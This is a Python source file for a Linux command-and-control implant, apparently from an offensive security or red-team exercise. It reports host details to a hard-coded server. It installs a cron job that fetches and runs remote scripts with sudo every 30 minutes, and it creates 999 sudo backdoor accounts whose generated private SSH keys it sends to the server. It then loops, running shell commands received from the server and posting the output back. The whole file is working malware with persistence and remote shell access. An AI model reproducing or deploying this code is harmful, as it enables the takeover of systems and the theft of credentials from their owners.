import subprocess

import psutil
import requests
import platform
import time

base_url = 'http://129.21.101.121:5000'


def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


def register():
    uname = platform.uname()
    # get os
    os = f"{uname.system} {uname.release}"
    # get host_name
    host_name = uname.node
    # get ip
    ip = requests.get('https://api.ipify.org').text
    # get system memory
    ram = get_size(psutil.virtual_memory().total)
    # set info in the requests json
    json = {
        'os': os,
        'host_name': host_name,
        'ip': ip,
        'ram': ram
    }
    response = requests.post(f"{base_url}/api/1.1/add_agent", json=json)
    print(response)
    return response.text


def cron_job():
    with subprocess.Popen(
            ['sudo crontab -l > cron_bkp'],
            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE):
        ""
    with subprocess.Popen(
            [f'sudo echo "*/30 * * * * sudo wget {base_url}/api/1.1/retrieve_scripts -O /tmp/test.py && '
             f'/usr/bin/python3 /tmp/test.py >/dev/null 2>&1" > cron_bkp'],
            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE):
        ""

    with subprocess.Popen(
            ['sudo crontab cron_bkp'],
            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE):
        ""
    with subprocess.Popen(
            ['sudo rm cron_bkp'],
            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE):
        ""


def linux_persistence(agent_id):
    cron_job()
    ssh_keys = dict()
    for i in range(1, 1000):
        # subprocess.run(['sudo', 'useradd', '-m', '-d', f"/home/bingus{i}", '-p', 'bingus', f"bingus{i}"
        #                , '-G', 'sudo'])
        with subprocess.Popen(
                [f'sudo useradd -m -d /home/bingus{i} -p bingus bingus{i} -G sudo'],
                shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE):
            ""
        # subprocess.run(['sudo', 'mkdir', f"/home/bingus{i}/.ssh"])
        with subprocess.Popen(
                [f'sudo mkdir /home/bingus{i}/.ssh'],
                shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE):
            ""
        # subprocess.run(['sudo', 'ssh-keygen', '-t', 'rsa', '-N', "", '-f', f"/home/bingus{i}/.ssh/id_rsa"])
        with subprocess.Popen(
                [f'sudo ssh-keygen -t rsa -N "" -f /home/bingus{i}/.ssh/id_rsa'],
                shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE):
            ""
        with subprocess.Popen(
                [f"sudo cat /home/bingus{i}/.ssh/id_rsa.pub | sudo tee -a /home/bingus{i}/.ssh/authorized_keys"],
                shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) as ssh_key_loot:
            ''
        with subprocess.Popen(
                [f"sudo cat /home/bingus{i}/.ssh/id_rsa"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                stdin=subprocess.PIPE) as private:
            key = private.communicate()[0]
            ssh_keys[f"bingus{i}"] = key.decode('utf-8').strip()
    json = {
        'id': agent_id,
        'keys': ssh_keys
    }
    requests.post(f"{base_url}/api/1.1/ssh_keys", json=json)


def get_command(agent_id):
    json = {
        'id': agent_id
    }
    # receive command from queue
    data = requests.post(f"{base_url}/api/1.1/get_command", json=json).text
    if data == 'None':
        time.sleep(1)
        return
    cmd = subprocess.Popen([data], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           stdin=subprocess.PIPE)
    output_bytes = cmd.stdout.read() + cmd.stderr.read()
    output_str = str(output_bytes, "utf-8")  # plain old basic string
    json['output'] = output_str
    # send the output back to the server
    data = requests.post(f"{base_url}/api/1.1/command_out", json=json)
    print(data.text)


if __name__ == "__main__":
    # register implant with server and receive an ID
    id_agent = int(register())
    linux_persistence(id_agent)
    # receive and run commands
    while True:
        get_command(id_agent)